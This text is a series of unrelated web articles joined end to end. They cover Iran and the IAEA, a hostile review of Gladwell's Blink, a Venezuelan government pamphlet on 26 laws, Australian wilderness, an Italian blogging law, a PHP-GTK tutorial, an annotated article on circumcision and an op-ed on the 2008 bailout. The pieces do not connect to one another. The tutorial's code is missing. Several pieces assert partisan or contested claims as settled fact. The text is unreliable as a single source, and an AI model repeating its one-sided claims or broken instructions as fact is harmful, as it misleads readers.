The report itself said that the IAEA “ regrettably has not been able to make any substantive progress on the alleged studies and other associated key remaining issues which remain of serious concern . ”
Iran has not even been allowed to see the documents upon which the allegations accusing it of seeking a nuclear weapon are founded .
Despite this , the IAEA has apparently insisted on being allowed access beyond that required of Iran under the nuclear non-proliferation treaty ( NPT ) .
Alaeddin Borujerdi , head of the Parliament ’s National Security and Foreign Affairs Committee , said , “ We are against offering the agency an open door once more and that they expect Iran to respond to any claim . ”
He also added , “ We do not think there should be an open forum so America can bring up a new claim every day and pass it on to the agency , expecting Iran to address any claim . ”
Iran ’s envoy to the IAEA , Ali Asghar Soltanieh , said , “ We continue cooperating with the IAEA but they should not expect us to apply the additional protocol . ”
Iran had previously voluntarily allowed inspectors a greater level of access despite not having agreed to the additional protocol and hence having no legal obligation to provide more access .
In response to the U.S. Referring Iran to the U.N. Security Council in 2006 , resulting in sanctions , Iran predictably stopped its voluntary effort to allow inspectors greater access than mandated under the NPT .
Soltanieh also said , “ No country would give information about its conventional military activities . ”
“ I said in this briefing , ” Soltaniah explained , “ ‘ Who in the world would believe there are a series of top secret documents U.S. Intelligence found in a laptop regarding a Manhattan Project - type nuclear ( bomb programme ) in Iran and none of these documents bore seals of ‘ high confidential ’ or ‘ secret ’ ?
This is simply unbelievable .
This matter is over , as far as we are concerned . ”
The threat that the U.S. or Israel might engage in a targeted airstrikes against Iran has continued to escalate .
Israel earlier this year conducted military exercises involving just such a strike in what was widely interpreted as a warning to Iran .
USA Today reported this week that “ The Pentagon is expanding its arsenal of bunker - busting bombs to knock out suspected programs to make weapons of mass destruction , such as Iran ’s , interviews and military planning documents show . ”
In addition , Israel has ordered 1,000 GBU - 39 bunker - busting smart bombs from Boeing in a deal announced by the U.S. Department of Defense last Friday .
At the same time , the U.S. is bolstering Israel ’s defenses , including by updating its arsenal of Patriot missile interceptors and deploying a new radar installation on what will be “ the first American base on Israeli territory , ” as the Israeli paper Haaretz noted .
Haaretz also reported last week that Israel had asked the U.S. for authorization to use Iraqi airspace for an attack on Iran .
The U.S. , for now , appears to be drawing the line short of this , and reportedly responded by telling the Israelis to coordinate with Iraqi Prime Minister Nuri al - Maliki .
If true , the statement could be interpreted as a clear , “ no . ” Maliki has assured Iran that Iraq would not be used for such an attack , and the U.S. is unlikely to threaten its relations with Iraq by undermining its sovereignty in such a blatant demonstration of U.S. hegemony over the country under the ongoing military occupation .
The European Jewish Congress in Brussels held a panel on the Iran issue that concluded , “ Only military action can stop Iran , or else Iran will acquire nuclear weapons to the great detriment of regional and even global stability . ”
The Congress , meanwhile , is debating two resolutions this week that seek to “ increase economic , political and diplomatic pressure on Iran to verifiably suspend its nuclear enrichment activities ” and call for “ stringent inspection requirements ” of all goods into and out of Iran , which would effectively amount to a naval blockade of the country — an action which would be widely considered an act of war .
The U.S. also has increased its military presence in the Persian Gulf .
Two carrier groups are there and a third is on its way .
Israeli journalist Ronen Bergman claims in a new book , The Secret War with Iran , that the U.S. and Israel have been engaged in clandestine operations to sabotage Iran ’s nuclear program .
Another interpretation might be that the U.S. is seeking rather , or at least simultaneously , to sabotage the IAEA ’s effort to verify the peaceful nature of Iran ’s program .
When the U.N. inspections teams in Iraq threatened to be near to declaring that Iraq had been disarmed , the Clinton administration intervened , launching a bombing campaign that forced the inspectors to withdraw from the country and ensured that they would not be allowed back .
The U.N. inspections had also been further undermined with revelations that U.S. intelligence was “ piggybacking ” inspections .
Iraq allowed inspectors into the country once again in 2002 .
By March , 2003 , the U.N. was once again threatening to find Iraq verifiably disarmed , prompting the U.S. to intervene once again with its military invasion to prevent this from happening and to implement by force the official policy of “ regime change ” that would be undermined were weapons inspectors to declare Iraq disarmed .
U.S. policy towards Iran has taken a similar course as it had towards Iraq prior to the military overthrow of Saddam Hussein ’s regime .
Meanwhile , further escalating the tensions by demonizing the country , the claim that Iran has been arming the Taliban has been resurrected yet again .
A BBC headline this week stated , “ Iran ‘ sending weapons to Taleban . ' ”
While the headline suggests a policy of the Iranian government , the report itself merely suggests that the Taliban might be receiving Iranian - made arms on the black market .
The BBC cites Taliban members who say they “ had received Iranian - made arms from elements in the Iranian state and from smugglers ” .
The report does not clarify whether “ elements ” within “ the Iranian state ” is meant to refer to elements of the Iranian government or not , despite the obvious intention to imply just that .
Iran denied the claim that its government has supported the Taliban , saying that it supported the government of Aghanistan under Hamid Karzai .
Iran has historically opposed the Taliban , instead supporting the Northern Alliance , while U.S. allies Pakistan and Saudi Arabia had been the Taliban ’s largest benefactors .

down , i say , down with malcolm gladwell !
I have been harboring a nagging suspicion about Malcolm Gladwell for some time now .
There is a word that keeps knocking at the back of my mind .
That word is ' fraud ' .
I suspect , in short , that Malcolm Gladwell is a fraud .
I finally picked up his book from a couple of years ago , Blink .
He subtitles it " The Power of Thinking Without Thinking . "
The book oozes with a slickness , a snake oil salesman 's set of cheap tricks and pseudo - intellectual come-ons .
My feeling of distaste is so strong that I 've come in a perverse way to admire Mr. Gladwell .
He has caused me to hate again .
I hate Blink .
But allow me to calm down .
Allow me to state the case .
Allow me to endeavor to prove that Blink is a piece of shit .
Malcolm Gladwell is a good writer and a clear writer .
He also knows how to entertain .
Blink is driven by a series of anecdotes and stories about people using their " adaptive consciousness , " that faculty of the brain that makes intuitive decisions before the conscious brain has even realized it .
Gladwell 's first story is about a kouros ( an ancient Greek statue of a young boy ) purchased by the Getty museum .
The museum hired lawyers and experts and scientists to authenticate the statue .
They got the green light for the purchase .
But another handful of experts not directly involved in the process did n't feel right about the statue .
They came to a number of snap conclusions just by glancing at it that told them something was amiss .
As Gladwell puts it , " In the first two seconds of looking — in a single glance — they were able to understand more about the essence of the statue than the team at Getty was able to understand after four months .
Blink is about those first two seconds . "
The stories keep coming .
Stories about a marriage expert who can interpret just a few facial expressions during a married couple 's fight and deduce whether or not they will be together in fifteen years .
Stories about our worst President , Warren Harding , who looked and sounded so much like a President that first impressions alone carried him to the White House , where he drank and whored around for a couple of years and then died .
There are stories about the snap decisions of cops who ended up murdering an innocent man , Amadou Diallo .
These stories are inherently interesting and dramatic .
Some of them are gripping .
The stories are n't the problem .
The sliminess and outright incoherence comes out when Gladwell starts telling us about what these stories are supposed to mean .
He is not shy about his claims .
These are not just amusing stories about the complicated and sometimes contradictory ways that human beings make decisions .
Gladwell positions himself as more than an observer and as something closer to a life coach or a guru .
He is going to teach people how to harness and make use of the power , the magic , of unconscious thinking .
He is going to make things that were difficult and well nigh unfathomable a lot easier .
And if people listen to him Gladwell predicts that it " would change the way wars are fought , the kinds of products we see on the shelves , the kinds of movies that get made , the way police officers are trained , the way couples are counseled , the way job interviews are conducted , and on and on .
And if we were to combine all those little changes , we would end up with a different and better world . "
How nice , how very nice .
The oddest thing about Blink , though , is the disconnect between these transformational claims and the actual arguments to be found inside .
Throughout the book , Gladwell sorts his stories and anecdotes into two broad categories .
On the one side are the stories about the so - called experts being shown up by the simple power of thinking without thinking .
In these cases , we learn about the magical powers we all harbor within ourselves .
On the other side , are stories about first impressions that have , in fact , led people astray .
In these cases , we learn how to fine - tune and perfect our blinking skills in order not to get it wrong .
The problem , of course , which Gladwell never sufficiently addresses , is that it is extremely difficult to know beforehand whether , in this or that instance , a person 's power of thinking without thinking is working as a strength or a weakness .
Here ’s an example of the ridiculousness of it all .
At one point , Gladwell discusses a musician called Kenna .
Kenna grew up in the US as the son of Ethiopian immigrants .
His music is hard to categorize .
But it has one hell of an impact on all the people who know something about music .
Gladwell is very much taken with Kenna .
He writes , " people who truly know music ( the kind of people who run record labels , go to clubs , and know the business well ) love Kenna .
They hear one of his songs and in the blink of an eye , they think , Wow ! "
But for all the high - powered support , Kenna 's albums have so far been a disappointment in terms of sales .
Gladwell draws the conclusion that Kenna has suffered from being taken out of context in the market research that goes on in the modern music business .
People listen to a short clip of his music without getting the full picture .
Gladwell writes ,
The people at the Roxy and the No Doubt concert saw him in the flesh .
Craig Kallman had Kenna sing for him , right there in his office .
Fred Durst heard Kenna through the prism of one of his trusted colleagues ' excitement .
The viewers of MTV who requested Kenna over and over had seen his video .
Judging Kenna without that additional information is like making people choose between Pepsi and Coke in a blind taste test .
Later in the book , Gladwell brings in another example from music , this time of the classical variety .
A long - time problem in classical music has been the gender disparity .
Women simply were n't getting very many jobs in orchestras .
Eventually , someone at the Munich Philharmonic came up with an ingenious solution .
People auditioning for the job did so behind a screen .
Voila !
Women started getting the jobs at far higher rates .
Gladwell quotes Julie Landsman from the Metropolitan Opera , " I 've been in auditions with without screens , and I can assure you that I was prejudiced .
I began to listen with my eyes , and there is no way that your eyes do n't affect your judgment .
The only true way to listen is with your ears and your heart . "
Gladwell notes of all this that , " When the screen created a pure Blink moment , a small miracle happened , the kind of small miracle that is always possible when we take charge of the first two seconds : they saw her for who she truly was . "
But then , why did n't the people in the market research surveys see Kenna for who he truly was ?
None of the music industry experts were claiming that Kenna is making music for the select few , they were claiming that Kenna has what it takes to be a hit maker .
Sure , his music might straddle a few categories but there are plenty of stars and hit makers in the history of popular music who 've done the same .
The whole goddamn point of making pop music is that people listen to the song on the radio or wherever and like it .
People listen to Kenna 's music and some like it , but a lot more simply do n't care for it .
Why is n't the market research situation a perfect Blink moment for judging Pop goodness ?
For some reason , in the case of Kenna , Gladwell thinks that we need more information , more time , a more rounded experience .
But with the classical musicians you create the Blink moment by taking information away .
Of course , even in the classical music example Gladwell never suggests that the judges are making their decisions in the first two seconds .
In fact , they are listening to a whole piece , they 've simply been prevented from making certain presuppositions by the screen .
Really , I 'm not at all sure why Gladwell calls this a " perfect Blink moment . "
It partially contradicts everything he is trying to say about the first two seconds and it is in complete contrast to the Kenna example , which is itself an utterly muddled attempt to apply the Blink lessons to a real world scenario .
Every story in the book falls apart in these ways when you break them down and ignore all of Gladwell 's bells and whistles .
They simply do not go where he is trying to make them go .
Really , Gladwell is simply amazed and flabbergasted by how we manage to make judgments at all .
There is no shame in this .
Human judgment is a fantastical thing .
But for Christ 's sake Malcolm , we 've all known that for a very long time .
In an act of hubris , chutzpah , complete stupidity , or a combination of all three , Gladwell comes out and admits as much in the Afterword to the book .
I quote the paragraph in its entirety .
What was that magical thing [ the ability to make the right decision ] ?
It 's the same thing that Evelyn Harrison and Tom Hoving had when they looked at the kouros , and that Vic Braden had when he watched someone serving and knew if the ball was going to go out .
It 's the kind of wisdom that someone acquires after a lifetime of learning and watching and doing .
It 's judgment .
And what Blink is — what all the stories and studies and arguments add up to — is an attempt to understand this magical and mysterious thing called judgment .
What ?
Judgment is an ability to apply a lifetime of learning and watching and doing to particular instances ?
That 's the great insight of Blink ?
That 's what all the portentous talk and self - aggrandizing tone was all about ?
That 's what the guru wants to tell us ?
The thing that every single fucking human being on planet earth over the age of twelve has already figured out ?
The truly maddening aspect to all this hooey is that Gladwell is not that far away from a respectable point .
There is a long tradition in Western thought ( and other ' thoughts ' besides ) of puncturing the claims of human knowledge and reminding us that most of what we know comes down to a matter of know - how and the ' knack ' .
One of my favorite figures in the history of marginal thinkers is the ancient Greek skeptic Sextus Empiricus .
Sextus was fed up with the lofty claims of the Platonists and the Aristotelians and wanted to show that human knowledge was a more pedestrian thing .
He subjected every philosophical claim to a series of withering cross examinations that inevitably exposed those claims to charges of circularity and begging of the question .
It was good stuff .
Let us cure ourselves , he suggested , of the will to absolute and objective knowledge and let us admit that we do know some things and that we 're not always so sure exactly how we know them .
He was aiming for ataraxia , or an unpurturbedness of mind .
His favorite story was of the painter Apelles , who , striving too hard to figure out how to paint the foam coming from a horse 's mouth , threw his painting implement in disgust and , lo and behold , it dashed against the wall in a perfect representation of the foam .
The point being , when we go outside of ourselves we forget how to do the very things we have always known how to do all along .
This is Gladwell 's point as well .
Simply living in the world gives us skills , a set of practical tools by which to continue living in the world .
Wittgenstein was wont to make the same observation .
He says famously that " judgment comes first . "
In short , we already know what we 're doing before we do it and the giving of reasons tends to be an a posteriori affair .
That 's the real and only insight ( if we can call it that ) to Gladwell 's flimsy book .
As human beings we do acquire a capacity to deal with the world and we often tend to make the right decisions without fully knowing why .
Experience gets embedded .
We act .
A kind of learned instinct takes over .
In our hubris , we try to codify this ability into doctrines and methodologies and systems of thought .
Sometimes there is reason to do so .
But in the end we should n't pretend that our vast acquisition of data and knowledge has allowed us to jump outside of ourselves .
We do n't have a God 's eye view of things .
We 're in the mix , in medias res , and the fact that we even manage to survive from day to day is at least weak proof that we know one or two things about the world .
But for the skeptics and empiricists and nominalists and pragmatists , this realization has a melancholy side as well .
Not knowing exactly how we know things is part and parcel , so far , of the essence of the human experience .
Only a charlatan pretends that there is magic in it .
In fact , the human condition , marvelous as it is , is also a depressing nightmare .
The crap - shoot of judgment has us perpetually hanging on the edge of an abyss .
Which brings us back to Gladwell the huckster .
Gladwell dresses up all of his " realizations " in fancy clothes and too much make - up .
He gives himself powers that he does n't have .
He pretends to have sorted things out that he has n't sorted out .
He imagines a possible control , and pretends that he has achieved that control .
All the while telling people , whispering into their ears , precisely the kinds of things they would like to believe .
And then ( it must , I 'm sorry , be said ) he goes on wildly lucrative corporate speaking engagements spinning out the same titillating stories combined with his shoddy conclusions .
I even kind of hate , I must confess , the way he looks .
His hair all scruffed up just so .
His cute little suits .
It makes the skin crawl .
***
Frustratingly , Gladwell ends the book with a reasonable and humane suggestion .
It even managed to numb my hate for a short time .
He suggests , in reference to the blind auditions that have created gender equality in the classical music world , that the justice system might benefit from the same approach .
He asks , " What if we put screens in the courtrooms ? … we know that what we see — particularly when it is the color of someone 's skin , or gender , or age — does not always aid understanding . "
I do n't think gender or age really has much to do with perverting justice in the American judicial system .
But color , unfortunately , still does .
Reducing the effect of racial bias would go a long way to balancing the scales .
And Gladwell 's suggestion for doing so is simple , practical , and damn well might be effective .
But it has nothing to do with what he 's been talking about for the previous 250 pages of the book .
His judicial solution is n't about trusting our snap judgments , but about trying to mute them .
It is n't about training ourselves to be clever about detecting the ' real criminal ' in less than two seconds .
Quite the opposite .
Certainly he has left room in the book for the negative lesson , for the sense that we have to know when it makes sense to put the brakes on our adaptive consciousness .
But that too is disingenuous .
Blink is supposed to be about the power of the snap judgment .
It is supposed to be about the wonderful things that happen when we think without thinking .
And in the end , he tells us , if you want a little justice , best to give yourself some time to really think it through .
The nicest thing that can be said about Malcolm Gladwell is that he does n't even really believe his own mental garbage .
If he is salvageable as a human being , it might be for the simple reason that he 's a bad fraud .

September 23 , 2008 -- Venezuelanalysis --
The following is a translation of a document produced by the Venezuela 's Ministry for Communication and Information .
It is a summary of the content of the 26 laws passed by the Venezuelan executive and also seeks to debunk some of the myths spread by the right - wing opposition .
The actual laws are 30 - 60 pages each , so it is an accessible way to learn what they are .
The Venezuelan government is distributing this summary across Venezuela .
The Spanish version is available here .
* * *
Since the approval of the 26 laws as part of the Enabling Law , the opposition has tried to rewrite the strategy of the 2D [ December 2 , 2007 , when the constitutional reform referendum took place ] , trying to provoke fear of communism among the citizens .
Without paying attention to the content of the laws , they are invoked over and again in order to solidify opinion around the supposed centralisation of the state , the presumed militarisation of the country , and the recurring aggressions the government has committed against private business .
Once again the opposition 's spirit shows its incapacity to objectively analyse the Venezuelan reality .
They have stopped examining the decrees with determination in order to discredit them and use them as a political banner for the upcoming elections on November 23 , 2008 .
Only a few voices have been raised to recognise that , in some of the legislation , there are beneficial aspects .
The following document summarises the essence of the laws in 10 points .
It does not even remotely try to cover all and every aspect of the decrees , but is useful as didactic , simple and synthetic material for the daily battle of ideas of the Bolivarian forces .
1 . Offer unprecedented advantages for small and medium businesses , guaranteeing greater prominence in the project of national development .
Yankee - wannabe lie [ pitiyanqui mentira ] :
The laws conspire against private property and create anxiety and uncertainty for business .
THE REVOLUTIONARY TRUTH :
Better credit opportunities for small and medium companies
The period to pay off credit in the agriculture sector is increased to 20 years ( Article 11 , Law of credit for the agriculture sector )
Conceives of forms of preferential payment for small and medium industry ( Law for the promotion and development of small and medium industry )
Exoneration in total or partially from the payment of taxes ( Art. 10 of the same law )
The internationalisation of these types of companies is promoted , in order to favour the development of their trade in the exchange with other countries
The state privileges them as suppliers
The articles 112,113 , and 115 of the Constitution set limits on private property for the public good and the integral development of the country
2 . To promote access to dignified housing for everyone , offering opportunities that could especially favor young people .
Yankee - wannabe lies :
They are still making them up
THE REVOLUTIONARY TRUTH :
Special protection for the purchase of housing for the least favored sectors ( elderly people , indigenous communities , most economically vulnerable sectors )
Mortgage credit of up to 100 % of the cost of housing ( Art. 61 , Law of housing and habitat lending )
Monthly payment quotas of housing can't exceed 20 % of total family income ( Art. 63 of the same law )
Non-refundable subsidies as direct help from the state to the poorest .
To combat the speculation in the real estate sector , contributing to the avoidance of skyrocketing rental prices
3 . The laws contribute to guaranteeing food security for the people , combat speculation , against hoarding and other forms of boycott of production , distribution and consumption of food .
Yankee - wannabe lies :
The state tries to control everything , including what and how much the population eats .
The state attacks private property by declaring property related with the production of food a " public utility " .
Product scarcity is a result of the price regulations imposed by the state .
THE REVOLUTIONARY TRUTH :
Any state , no mater the political system that it represents , is obliged to guarantee food to all its citizens and to take measures necessary to achieve this aim .
The state will strictly respect private property .
It reserves the right to forcibly acquire property only ``when a security motive arises '' ( Art. 3 of the Law of integral agricultural health ) .
Why do the oligarchy protest ?
Because this law combats their intentions to hoard , speculate and block food during virtual coup conditions ?
The honest proprietors , who work positively for the development of the country do n't have anything to fear .
Behind the scarcity of products is the exploitative action or the regular hoarding of intermediaries .
So the state has the responsibility to supervise the production chain , commercialisation , and distribution of food , in defense of consumers .
The unwarranted rise of prices is avoided .
Agricultural supplies are guaranteed for producers
Guarantees investment in technology and transport .
Financing and credit are n't awarded only to primary producers , but also to other components of the chain that the state will supervise .
More economic resources for small and medium producers .
4 . The laws incorporate the social missions as part of the state structure , guaranteeing in a more articulated manner , their continuity and future development .
Yankee - wannabe lies : Curiously , in demagogic electoral discourse the opposition talks of the necessity to improve the missions and establish them as permanent projects .
THE REVOLUTIONARY TRUTH
It would seem that they refer to article 131 of the Law of Public Administration .
They could be in agreement with this law and they do n't even know it .
5 . The laws strengthen consumer protection , including measures especially favourable to the middle class
Yankee - wannabe lies :
The state wants to expropriate small and medium - sized companies at its whim , putting them in a scenario of incurable helplessness .
THE REVOLUTIONARY TRUTH
The law prohibits surcharges or commissions when the paying by credit card , debit , ticket , or electronic food card ( art. 15 , aside 7 of the Law for the defence of people 's access to goods and services ) .
Could someone from the middle class oppose this measure ?
Does n't it by any chance contribute to the saving of their income ?
Foresees strong sanctions against the violators of prices and against those who adulterate the quality of products .
Protects the merchants from the speculation of wholesalers .
In the case of food speculation , it does n't fight the street venders but rather the greedy wholesalers .
6 . Empowers the communal councils as power structures , in accordance with the will to award more and more authority to the people to govern .
Yankee - wannabe lies :
The communal councils would be more like formal entities than real , within the context of the authoritarian state .
The communal councils will invade private property .
The administration of public wellbeing at a regional level would be even more in the hands of inept people .
THE REVOLUTIONARY TRUTH
In reality , through communal councils the state opens itself in a transparent manner to the scrutiny of the people , to their advice and criticisms .
The comptroller committees of the communal councils defend the rights of the community against potential irregularities in the governing ( Art. 91 , Law of defence of people 's access to goods and services ) .
The state de-bureaucratises itself in order to transfer larger quotas of power to the communal councils in the activity of public management .
There is a more active popular participation in decision making and economic planning at the regional level .
It is ridiculous to resort to arguments that the laws are autocratic because the laws mention the word ``people '' less than the word ``president ' ' .
All the laws function to defend the interests of the people in the economic , political , judicial and social fronts .
7 . Foster the protection of the environment , within the context of world alarm due to the exhaustion of natural resources .
Yankee - wannabe lies :
They are still inventing them .
THE REVOLUTIONARY TRUTH
The privatisation of the administration of ports is prohibited ( Law of aquatic spaces ) .
The running of aquatic spaces should correspond to the policy of sustainable development established by the state ( Law of aquaritc spaces ) .
Commits to the maintenance of navigational routes .
Transcends a merely pragmatic concept of tourist activity , entrusting the community with the care and rational running of natural resources ( Law of tourism ) .
8 . Foster the development of railway transport , with a conception that integrates the surrounding communities as part of this development .
Yankee - wannabe lies :
They are still inventing them .
THE REVOLUTIONARY TRUTH
It 's about promoting community projects in areas far away from train stations .
Activate commercial belts around these stations , stimulating production and generating employment for the inhabitants of these areas .
9 . Transcend the concept that divides ``the military '' ( the armed forces ) and the ``people '' into separate bands , fostering the co-responsibility of citizens for the defense of the nation .
Yankee - wannabe lies :
The country is being militarised .
Obligatory military services would be established .
The Cuban model is being copied .
It 's unconstitutional to name the Armed Forces of Venezuela " Bolivarian " .
THE REVOLUTIONARY TRUTH
They have tried to demonise the militias , which in reality are composed of the current reserve and people prepared to defend their revolution .
Entrance to the militias is absolutely voluntary .
No one has to feel obligated to join them .
Some despotic governments abstain from incorporating their people in strategies of defence for fear of losing power to the force of these people .
This government is known so much as a representative of the people that it does n't hesitate to democratise military technology and knowledge for the citizens .
The militia is not branded by the US military conception that bases its army on mercenaries or contractors .
It 's against logic to try to say it is unconstitutional to name the armed forces as Bolivarian , if the Republic has the same epithet .
10 .
Attack the bureaucracy , making solutions to the problems of the citizens sharp , feasible and efficient
Yankee - wannabe lies :
The state is more and more bureaucratic and establishes excessive regulations to control the economy and society more and more .
THE REVOULTIONARY TRUTH
The public administration should not demand documents from the citizen that they ( the administration ) possess or can access ( Law of the simplification of administrative steps ) .
Unnecessary authorisations and excessive requirements for detailed information are eliminated .
The requirement to present certified copies of birth , marriage or death certificates is eliminated , unless the law contains it .
In the case of loss or destruction of a document , it will be sufficient if the interested person makes a declaration .

A study has found that more than 40 per cent of Australia remains undamaged by humans .
Scientists from the Pew environment group and the Nature Conservancy have identified Australia alongside Antarctica and the Amazon as one of the five most important wild areas on earth .
But the study also found Australia has the world 's highest rate of species extinction because of threats from feral animals , invasive weeds and bushfires .
Report author , Dr Barry Traill , is concerned that only 10 per cent of Australia 's wilderness is protected .
He says the number of Indigenous rangers should be increased from 700 to 5,000 to help conserve the environment .
" Areas such as the north Kimberley coast are owned by Aboriginal people and many of them are doing excellent work managing that country , providing environmental services for all Australians , " he said .
" But we think more assistance would be invaluable in doing the works required to make sure that country stays in absolute top condition . "
Italian bloggers are up in arms at a court ruling early this year that suggests almost all Italian blogs are illegal .
This month , a senior Italian politician went one step further , warning that most web activity is likely to be against the law .
The story begins back in May , when a judge in Modica ( in Sicily ) found local historian and author Carlo Ruta guilty of the crime of " stampa clandestina " – or publishing a " clandestine " newspaper – in respect of his blog .
The judge ruled that since the blog had a headline , that made it an online newspaper , and brought it within the law ’s remit .
The penalties for this crime are not onerous : A fine of 250 Euros or a prison sentence of up to two years .
Carlo Ruta was fined and ordered to take down his site , which has now been replaced by a blank page , headed " Site under construction " , and a link directing surfers to his new site .
Hardly serious stuff – except that he now has a criminal record , and his original site has disappeared .
The offence has its origins in 1948 , when in apparent contradiction of Article 21 of the Italian Constitution guaranteeing the right to free expression , a law was passed requiring publishers to register officially before setting up a new publication .
The intention , in the immediate aftermath of Fascism , may have been to regulate partisan and extremist publications .
The effect was to introduce into Italian society a highly centrist and bureaucratic approach to freedom of the Press .
A further twist to this tale took place in 2001 , with the realisation that existing laws were inadequate to deal with the internet .
Instead of liberalising , the Italian Government sought to bring the internet into the same framework as traditional print media .
Law 62 , passed in March 2001 , introduces the concept of " stampa clandestina " to the internet .
The suspicion expressed by a number of commentators is that this extension of the law suited government and publishers alike .
The state was able to maintain its benevolent stranglehold on the media , whilst publishers could use the system of authorisation and regulation as a means to extend state subsidies to their ventures on the internet .
What few noticed at the time was that this law had the capacity to place blogs on a par with full - blown journalism .
It would only take a judge to decide that something as simple as a headline was what defined a " newspaper " .
One of the supporters of this law in 2001 was Giuseppe Giulietti , now a Deputy with the Italia di Valori Parliamentary Grouping .
Back then , he brushed aside criticism of the proposed law with the reassurance that " The Press Law has never had as its objective the regulation of the online community " .
What a difference a few years make .
Earlier this month , the same Giuseppe Giulietti could be found writing to the Minister for Justice that " current logic means that almost the entire Italian internet , by its very nature , could be considered illegal – " stampa clandestina " – which is a complete contravention of the democratic rulebook " .
So is this just a storm in a teacup ?
After all , if this law potentially affects some 5 million Italian websites , there are at least 4,999,999 that have not yet been taken down .
Why was Carlo Ruta singled out ?
One clue lies in the location of the court that found him guilty ( Sicily ) .
Another , in the fact that his blog contained much detailed research of links between politics and the mafia – always a sensitive subject in Italy .
Since May , a Calabrian journalist and blogger , Antonino Monteleone , has also fallen foul of local magistrates , suggesting that the genie is now well and truly out of the bottle .
Failing a reversal of the Ruta ruling in a higher court , it is going to need action at the parliamentary level to guarantee an Italian freedom to blog and to return the law to what most Italians believed it to be . ®

It is an application programming interface ( API ) that allows you to develop GUI applications using PHP and it 's object - oriented programming concepts .
It uses the The GIMP Toolkit , created by the makers of the popular graphics editor GIMP .
Why not ?
PHP is already widely known as a web language used in developing web applications , and it is also used as a scripting language on the command line .
It 's fun for a PHP programmer to be able to create GUI applications with PHP .
And all programmers program for fun ( well , they should , at least ) .
First , let 's assume you are using Windows have PHP installed in C:\php .
Now , let 's visit the PHP - GTK website , specifically the download page .
Download the latest Windows binary , which , as of now is 2.0.1
Once you 've downloaded it , extract the folder named php - gtk2 to C:\php .
Your directory path should look like C:\php\php - gtk2 .
Now , create a . php file named test .
php inside of the php - gt k2 folder .
Put this code inside of the folder : Now , open up Command Prompt .
Go to Start , then find the Run button .
Click it , and type ' cmd ' without the quotes into the box .
The Command Prompt box should come up , in all of it 's dark and ill - foreboding glory .
Use the ' cd ' command to change your current working directory ( CWD ) to C:\php\php - gtk2 .
Then type this :

Congratulations , you 've made your first GUI application in PHP !
I 'm afraid I cannot cover all aspects of PHP - GTK here .
There 's a limitless amount of things that can be done with PHP - GTK , and if I went over them all here , this would change from a tutorial into a PHP - GTK user manual .
But do n't fret , because below I 've given the best resources on PHP - GTK that Google can find !-
This gives tons of examples , and is a great place to see how to do a specific task in PHP - GTK -
If at first you do n't succeed , read , read the documentation .
Not to mention the search bar at the top of the page allows you to search for a specific function ( just like the PHP.

September 30 , 2008 Male and Female Circumcision Basics Why Female Genital Mutilation Is More Severe © Brandi Rhoades
Many people mistakenly believe that circumcision is the same whether done on a male or female .
[ Wrong : nobody says they are the same , except as human rights abuses . ]
Find out the differences .
Male circumcision still exists in many parts of the post - industrial world while female circumcision does not and is at the center of many inflammatory news articles .
Some people argue the practices are the same [ Hardly anyone puts it as simplistically as " the same " ] and that circumcision done on girls is reviled only because it occurs primarily in Africa .
[ Or rather , because male circumcision is familiar but female genital cutting is perceived as " alien " . ]
Learning more about the practices will help understand why the two practices are not equivalent .
One of the primary differences in the two practices is that while male circumcision happens around the world but is more common in Western nations , FGM is almost exclusively a phenomenon in Africa .
[ Wrong : Male Genital Cutting is prevalent only in the Muslim world , the US , the Philippines , South Korea , tribal Africa , Israel , eastern Polynesia and outback Australia .
Female Genital Cutting is very common in Indonesia and Malaysia . ]
Most people in the Judeo - Christian tradition , which includes millions of people in the United States , believe in male circumcision to be done shortly after birth .
[ Wrong : Christianity has condemned circumcision from its beginnings . ]
In parts of Africa , FGM is a religious ritual , though its roots most often are cultural .
Male circumcision happens under medical supervision , unlike the majority of female circumcision rituals .
[ Wrong : male circumcision is widespread under tribal conditions in Africa and performed by non-medical people throughout the Islamic world .
FGM is performed by medical personnel in Indonesia and Malaysia . ]
Female genital mutilation typically occurs in a village where there is no medical care .
The girls do not receive any anesthesia , which is rarely the case with male circumcision , and the instruments are not sterilized .
FGM also tends to be carried out by people trained as the village ’s “ circumciser , ” but not by someone with medical training , meaning the cuts are jagged an inexact .
Male babies in the United States also receive follow - up medical care and can get treatment should any problems arise from the circumcision while girls who are the victims of FGM do not have this opportunity because of poor healthcare in areas where it is performed .
Girls die or face infections each year because of the lack of follow - up care available for complications from genital mutilation .
[ 34 boys died from tribal circumcision in 2008 in the Eastern Cape Province of South Africa . ]
FGM involves the cutting off of entire portions of the female anatomy .
For boys , the removal of the foreskin is more about removing an “ extra ” piece of skin than removing a center of pleasure .
[ Wrong :
The foreskin is not " extra " it is integral to the male sexual system .
FGM may involve no more than a token nick . ]
Removing the clitoris , which occurs in many FGM rituals , is done to help ensure that girls do not derive any pleasure from their sexuality , thus encouraging them to remain pure .
The male equivalent of FGM would be the removal of the tip of the penis up to and including the removal of the penis and scrotum .
Female genital mutilation is far more severe than male circumcision .
Many in the U.S. argue against male circumcision as well .
Because FGM is more severe does not diminish their arguments .
Male circumcision very well may not be a good idea and may fade out , but that does not negate the fact that the female version is not equivalent in terms of immediate result or long - term consequence .
[ This article ignores any ethical or human rights issues involved in removing healthy , sensitive tissue from a non-consenting person .
A pity , because of course it would find the case against Female Genital Cutting very strong on that basis alone . ]

This is the first time in the history of the United States that the president has sought to provoke a financial panic to get legislation through Congress .
While this has proven to be a successful political strategy , it marks yet another low point in American politics .
It was incredibly irresponsible for President Bush to tell the American people on national television that the country could be facing another Great Depression .
By contrast , when we actually were in the Great Depression , President Roosevelt said that , " we have nothing to fear , but fear itself . "
It was even more irresponsible for him to seize on the decline in the stock market five days later as evidence that his bailout was needed for the economy .
President Bush must surely understand , as all economists know , that the daily swings in the stock market are driven by mass psychology and have almost nothing to do with the underlying strength in the economy .
The scare tactics of President Bush , Secretary Paulson and Federal Reserve Board Chairman Bernanke created sufficient panic , so that by the time of the vote , much of the public believed that the defeat of the bailout may actually have had serious consequences for the economy .
Millions of people have changed their behavior because of this fear , with many pulling money out of bank and money market accounts , and in other ways adjusting their financial plans .
This effort to promote panic is especially striking since the country 's dire economic situation is almost entirely the result of the Bush Administration 's policy failures .
First and foremost , the decision of Secretary Paulson and Chairman Bernanke ( and previously Alan Greenspan ) to ignore the housing bubble , allowed for the growth of an $ 8 trillion bubble , which is now collapsing .

It is the collapse of this bubble , which has already destroyed more than $ 4 trillion in housing wealth , and is likely to destroy another $ 4 trillion over the next year , that is at the root of the economy 's problems .
While competent economists were warning of the bubble and the dire consequences of its collapse , the top officials in the Bush administration were celebrating the rise in homeownership rates .
The Bush administration made the crisis even worse by deregulating Wall Street .
